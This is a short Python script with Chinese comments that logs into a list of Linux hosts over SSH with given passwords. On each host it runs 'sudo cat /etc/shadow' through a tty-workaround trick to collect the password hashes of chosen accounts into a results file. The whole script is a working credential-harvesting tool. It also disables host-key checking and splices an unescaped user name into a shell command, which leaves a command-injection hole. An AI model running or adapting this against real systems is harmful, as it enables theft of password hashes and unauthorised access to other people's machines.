#coding=utf-8

'''
# 主机IP、用户名、密码、需获取密码Hash的账号，按以下格式写入ssh_ip_user.txt文件中，使用Tab分隔。
Example：
192.168.123.200	root	toor	test
192.168.123.202	root	toor	root

# 结果文件内容使用追加模式写入，不会覆盖已有内容。

2018.4.10 v0.1 By Shad0wpf
2018.4.11 v0.2 By Shad0wpf 解决"sudo: sorry, you must have a tty to run sudo"报错问题

'''

import paramiko

result_file = 'get_linux_shadow_result.txt'
host_file = 'linux_ip_user.txt'

# line = '192.168.123.200\troot\ttoorr\ttest'
# line2 = line.split('\t')

# hostname = line2[0]
# port =  22
# username = line2[1]
# password = line2[2]
# getuser = line2[3]

def getshdow(hostname,port,username,password,getuser):
    f = open(result_file,'a+')
    try:
        # 创建SSH对象
        ssh = paramiko.SSHClient()
        # 允许连接不在know_hosts文件上的主机
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        # 连接服务器
        ssh.connect(hostname=hostname, port=port, username=username, password=password, timeout=60.0)



        # 执行命令("/etc/sudoers"文件未注释掉"Defaults    requiretty",直接执行命令会报错)
        # command = 'sudo cat /etc/shadow | grep ' + getuser
        # stdin, stdout, stderr = ssh.exec_command(command,timeout=20.0)
        # result = stdout.read().decode()

        # 解决"sudo: sorry, you must have a tty to run sudo"
        command = 'setsid script -c "sudo cat /etc/shadow | grep ' + getuser + '" /dev/null'
        stdin, stdout, stderr = ssh.exec_command(command,timeout=10.0)
        # result = stdout.read().decode().split('\n')
        result0 = stdout.read().decode().split('\n')
        for x in result0:
            if getuser in x:
                result = x
                break
            else:
                result = ''

        # 获取错误提示（stdout、stderr之中输出其中一个）
        # err = stderr.read()

        # 关闭连接
        ssh.close()


        # f = open(result_file,'a+')
        if result != '':
            print(hostname,'-',getuser,':Hash获取成功')
            s = hostname+':'+str(result)
            f.write(s)
        else:
            
            if stderr.read().decode() != '':
                print(hostname,'-',getuser,':命令执行失败')
                print(hostname,'-',getuser,stderr.read().decode())
                s = hostname+':'+getuser+u':Command execution failed.\n'
            else:
                print(hostname,'-',getuser,':未找到该用户密码Hash')
                s = hostname+':'+getuser+u':Can\'t find this user!\n'
            f.write(s)
    
    except Exception as e:
        print(hostname,'-',getuser,':',e)
        s = hostname+':'+getuser+':'+str(e)+'\n'
        f.write(s)


    finally:
        f.close()


userfile = open(host_file)
userlists = userfile.readlines()

for userline in userlists:
    userline2 = userline.replace('\n','').split('\t')

    hostname = userline2[0]
    port =  22
    username = userline2[1]
    password = userline2[2]
    getuser = userline2[3]
    getshdow(hostname, port, username, password, getuser)